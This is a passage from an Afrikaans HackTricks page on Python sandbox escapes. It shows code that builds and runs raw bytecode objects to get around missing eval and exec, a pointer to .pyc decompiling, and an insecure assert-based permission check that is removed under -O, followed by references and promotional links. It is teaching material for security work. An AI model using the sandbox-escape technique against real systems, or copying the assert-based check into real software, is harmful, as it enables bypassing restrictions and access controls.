codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
As jy nie toegang het tot `eval` of `exec` nie, kan jy 'n **korrekte funksie** skep, maar om dit direk te roep, sal gewoonlik misluk met: _konstrukteur nie toeganklik in beperkte modus nie_. Jy het dus 'n **funksie wat nie in die beperkte omgewing is nie, nodig om hierdie funksie te roep**.
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Decompiling Compiled Python

Deur gebruik te maak van hulpmiddels soos [**https://www.decompiler.com/**](https://www.decompiler.com) kan 'n persoon die gegee kompilering van Python-kode **decompileer**.

**Kyk na hierdie tutoriaal**:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## Misc Python

### Assert

Python wat uitgevoer word met optimisasies met die parameter `-O` sal beweringsverklarings en enige kode wat afhanklik is van die waarde van **debug** verwyder.\
Daarom, kontrole soos
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## Verwysings

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
